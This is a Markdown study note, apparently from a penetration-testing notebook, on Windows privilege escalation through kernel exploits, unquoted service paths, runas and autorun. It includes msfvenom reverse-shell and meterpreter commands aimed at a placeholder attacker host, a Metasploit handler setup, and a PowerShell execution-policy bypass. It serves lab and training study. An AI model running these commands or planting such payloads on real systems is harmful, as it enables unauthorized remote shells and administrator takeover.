# Windows Privesc

## Enumeration

- You can do some manual enumeration using [Windows CMD](powershell-cmd.md#cmd)
- You can also do automatic enumeration using dedicated [tools (see the tools below)](#tools)

## Kernel Exploits

### What is a kernel

![Kernel](https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Kernel_Layout.svg/1024px-Kernel_Layout.svg.png)  
- [See the definition on Wikipedia](https://en.wikipedia.org/wiki/Kernel_(operating_system))

#### Windows kernel

![Windows kernel](https://www.thewindowsclub.com/wp-content/uploads/2019/08/Windows-Kernel.png)  
- [Windows kernel in detail here](https://www.thewindowsclub.com/what-is-a-kernel-in-os-what-are-the-types-of-kernel)

### Kernel Exploits

- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
- See an example of a privesc with a kernel exploit in [this writeup](../writeups/HTB-Devel.md)

#### Methodology

1. Enumerate win version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, GIthub)
3. Compile and run

**ATTENTION: Kernel exploits are often unstable and could crash the system**

### Tools

#### Executables

- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [Watson](https://github.com/rasta-mouse/Watson)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [SharpUp](https://github.com/GhostPack/SharpUp)

#### PowerShell

- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [JAWS](https://github.com/411Hall/JAWS)

#### Other

- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
- [Precompiled kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Unquoted Service Path Vulnerabilities

### What is it

Abuse of the research methodology of executable of windows. We will try to place an excutable in a location windows will be looking.

### Preresquisites

- We will need write permissions in an executable folder
- Check if the binary path is unquoted, we can check a service using `sc qc name-of-service`
- Check if we have writing rights with our user we can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` we will have a list of user groups with read and write privs
- Use msfvenom to generate an executable file `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK-MACHINE-IP LPORT=7777 -f exe > executable_name.exe`
- Restart the service `sc start service-name `

### Methodology

- Enumerate with automatic tools or this command: `wmic service get name,displayname,pathname,startmode` (it will list the running services)
- Check if we can write in the folder of the service 

## Runas

### What is it

- It is the possibility of running a command as another user

### Enumerate

- `cmdkey /list`

### How to exploit

- Check the writeup for Access on HTB [here](../writeups/HTB-access.md) to have an example of privesc using runas

## Autorun

### What is it

- It is when you abuse the fact that a program runs automatically

### Enumerate

- Check what programs have autorun using [Windows internals - autorun](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) see example below  
![image](https://user-images.githubusercontent.com/96747355/162574595-2e7704db-5be0-411c-98f0-1b075628ec92.png)  

- Check that the program you found that allows FILE_ALL_ACCESS to Everyone using [Windows internals - accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in our example we would type this in the cmd `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`  
![image](https://user-images.githubusercontent.com/96747355/162574634-d6459714-366e-4afa-9735-d469eb8e3ab9.png)  

**OR**  

- With [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
  - In a win cmd type `powershell -ep bypass`
  - Then `. .\PowerUp.ps1` to load powerUp
  - `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162574989-40f208c1-12ac-47d6-99b7-3035cf9b4297.png)  

### How to exploit

- In kali
  - `msfconsole`
  - `use multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost Your-Kali-IP-Address`
  - `run`
  - In another cmd tab `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe` (give it the same name as the program that has autorun)
- Take the program you created with msfvenom in your target (python HTTP server and then the browser in your target)
- In your target
  - Place the program in the directory where the autorun program is
  - Wait for the administrator to log in
- You should have a shell in your kali in Metasploit

## Resources

{% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
{% embed url="https://tryhackme.com/room/windowsprivescarena" %} Windows privesc arena by TCM on TryHackMe {% endembed %}
{% embed url="https://www.fuzzysecurity.com/tutorials/16.html" %} Windows privesc on Fuzzy Security{% endembed %}  
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %} Windows privesc on PayloadsAllTheThings{% endembed %}  
{% embed url="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" %} Windows privesc on Absolomb{% endembed %}  
{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %} Windows privesc Sushant 747{% endembed %}  
{% embed url="https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources" %} Windows-Privilege-Escalation-Resources - TCM Course Resources - Gr1mmie {% endembed %}  
{% embed url="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation" %} Windows PrivEsc Checklist - Hacktricks {% endembed %}  
{% embed url="https://github.com/gtworek/Priv2Admin" %} Priv2Admin {% endembed %}  
